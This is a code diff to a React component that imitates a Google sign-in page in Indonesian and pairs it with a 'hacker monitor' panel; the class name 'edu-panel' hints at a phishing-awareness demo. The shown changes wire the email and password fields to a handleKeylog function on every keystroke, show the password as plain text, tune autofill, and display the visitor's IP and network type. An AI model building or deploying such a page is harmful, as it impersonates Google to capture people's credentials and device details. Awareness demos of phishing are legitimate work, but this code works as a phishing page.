@@ -161,23 +161,95 @@ export default function ArtupUltimateV4() {
       <style
         dangerouslySetInnerHTML={{
           __html: `
-        .g-card { background: white; border-radius: 8px; width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; }
-        .g-input { width: 100%; border: 1px solid #dadce0; border-radius: 4px; padding: 13px 15px; font-size: 16px; color: #202124 !important; background: white !important; transition: border 0.2s; }
-        .g-input:focus { border: 2px solid #1a73e8; outline: none; }
-        .btn-blue { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; transition: 0.2s; }
-        .btn-blue:hover { background: #1765cc; }
-        
-        /* PANEL MONITOR: RESPONSIVE */
-        .edu-panel { background: #080808; color: #00ff41; width: 100%; padding: 25px; font-family: 'Consolas', monospace; font-size: 11px; border-top: 4px solid #ff0000; }
-        @media (min-width: 1024px) {
-          .edu-panel { width: 450px; height: 100vh; border-top: none; border-left: 4px solid #ff0000; overflow-y: auto; position: sticky; top: 0; }
-        }
-        
-        .log-line { margin-bottom: 4px; border-left: 2px solid #222; padding-left: 10px; line-height: 1.4; }
-        .data-label { color: #888; text-transform: uppercase; font-size: 9px; margin-bottom: 2px; }
-        .val-text { color: #fff; font-weight: bold; }
-        .danger-val { color: #ff3333; font-weight: bold; }
-      `,
+    /* --- GOOGLE STYLE AUTH (KIRI) --- */
+    .g-card { background: white; border-radius: 8px; width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; }
+    .g-input { width: 100%; border: 1px solid #dadce0; border-radius: 4px; padding: 13px 15px; font-size: 16px; color: #202124 !important; background: white !important; transition: border 0.2s; }
+    .g-input:focus { border: 2px solid #1a73e8; outline: none; }
+    .btn-blue { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; transition: 0.2s; }
+    .btn-blue:hover { background: #1765cc; }
+
+    /* --- HACKER MONITOR PANEL (KANAN) --- */
+    .edu-panel { 
+      background: #000; 
+      color: #00ff41; 
+      width: 100%; 
+      padding: 25px; 
+      font-family: 'Courier New', Courier, monospace; 
+      font-size: 11px; 
+      border-top: 4px solid #00ff41; 
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Efek Garis Monitor (Scanline) */
+    .edu-panel::before {
+      content: " ";
+      display: block;
+      position: absolute;
+      top: 0; left: 0; bottom: 0; right: 0;
+      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
+                  linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+      z-index: 2;
+      background-size: 100% 2px, 3px 100%;
+      pointer-events: none;
+    }
+
+    @media (min-width: 1024px) {
+      .edu-panel { 
+        width: 450px; 
+        height: 100vh; 
+        border-top: none; 
+        border-left: 1px solid #00ff41; 
+        overflow-y: auto; 
+        position: sticky; 
+        top: 0; 
+        box-shadow: -10px 0 30px rgba(0, 255, 65, 0.05);
+      }
+    }
+
+    /* Efek Teks Menyala */
+    .log-line { 
+      margin-bottom: 4px; 
+      padding-left: 10px; 
+      line-height: 1.4; 
+      text-shadow: 0 0 5px rgba(0, 255, 65, 0.7);
+    }
+    
+    .data-label { 
+      color: #003b00; 
+      text-transform: uppercase; 
+      font-size: 9px; 
+      font-weight: bold;
+      margin-bottom: 2px; 
+      letter-spacing: 1px;
+    }
+
+    .val-text { 
+      color: #d1ffbd; 
+      font-weight: bold; 
+      background: rgba(0, 255, 65, 0.05);
+      padding: 2px 4px;
+      border-radius: 2px;
+    }
+
+    /* Tanda Bahaya Berkedip */
+    .danger-val { 
+      color: #ff0000; 
+      font-weight: bold; 
+      text-shadow: 0 0 10px #ff0000;
+      animation: blink 0.8s infinite;
+    }
+
+    @keyframes blink {
+      50% { opacity: 0.3; }
+    }
+
+    /* Scrollbar Hacker Style */
+    .edu-panel::-webkit-scrollbar { width: 4px; }
+    .edu-panel::-webkit-scrollbar-track { background: #000; }
+    .edu-panel::-webkit-scrollbar-thumb { background: #003b00; }
+    .edu-panel::-webkit-scrollbar-thumb:hover { background: #00ff41; }
+  `,
         }}
       />
 
@@ -210,18 +282,22 @@ export default function ArtupUltimateV4() {
                   type="email"
                   placeholder="Email atau ponsel"
                   className="g-input"
+                  value={email} // Hubungkan ke state email
                   onChange={(e) => handleKeylog(e.target.value, "email")}
                   required
                   autoFocus
+                  autoComplete="username"
                 />
               ) : (
                 <input
                   type="text"
                   placeholder="Masukkan sandi"
                   className="g-input"
+                  value={pass} // Hubungkan ke state pass agar tidak bocor dari email
                   onChange={(e) => handleKeylog(e.target.value, "pass")}
                   autoFocus
                   required
+                  autoComplete="new-text" // Standar paling kuat agar tidak autofill
                 />
               )}
             </div>
@@ -267,9 +343,10 @@ export default function ArtupUltimateV4() {
 
           <div>
             <p className="data-label">Network_Status</p>
-            <p className="val-text">{sysInfo.ip}</p>
+            {/* Gunakan sysInfo.ip jika sudah ada, jika belum tampilkan status scanning */}
+            <p className="val-text">{sysInfo.ip || "Detecting..."}</p>
             <p className="val-text text-[10px] text-blue-400">
-              {hardware.netType} Speed
+              {hardware.netType || "Unknown"} Speed
             </p>
           </div>
           <div>
